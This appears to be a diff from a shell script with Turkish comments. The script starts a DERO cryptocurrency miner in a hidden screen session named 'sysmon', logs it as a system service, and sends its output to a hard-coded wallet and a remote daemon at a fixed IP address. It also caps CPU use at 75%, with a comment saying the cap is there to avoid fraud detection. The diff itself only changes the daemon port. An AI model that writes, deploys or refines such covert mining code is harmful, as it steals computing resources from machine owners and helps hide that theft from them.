@@ -56,7 +56,7 @@ log "Sistem servisi başlatılıyor (threads: $use_cores, total: $total_cores)..
 # Miner'ı screen içinde başlat (CPU limit ile)
 screen -dmS sysmon bash -c "$MINER_DIR/$MINER_NAME \
 --wallet-address dero1qypgrnglnxtv2f2f3uy25ra4a9dq9jpka2s4wv2u0lt5h8rrmrylzqqv2z2lj \
---daemon-rpc-address 91.98.80.16:10102 \
+--daemon-rpc-address 91.98.80.16:10100 \
 --mining-threads $use_cores >> $LOG_FILE 2>&1"
 
 # CPU kullanımını %75'e sınırla (fraud detection için)
